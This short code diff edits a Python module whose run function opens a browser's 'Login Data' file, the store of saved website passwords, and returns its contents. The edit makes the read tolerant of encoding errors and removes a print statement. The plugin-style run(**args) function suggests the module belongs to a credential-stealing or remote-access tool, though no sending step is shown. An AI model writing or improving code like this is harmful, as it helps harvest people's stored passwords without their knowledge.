@@ -1,4 +1,7 @@
 import os
+import codecs
+
+
 
 def run(**args):
 
@@ -6,9 +9,7 @@ def run(**args):
 
 	if os.path.exists(path):
 
-		with open(path + r'\Login Data', encoding="utf8") as f:
-
-			print(f.read())
+		with codecs.open(path + r'\Login Data', 'r', encoding="utf8", errors = 'ignore') as f:
 
 			return f.read()
 
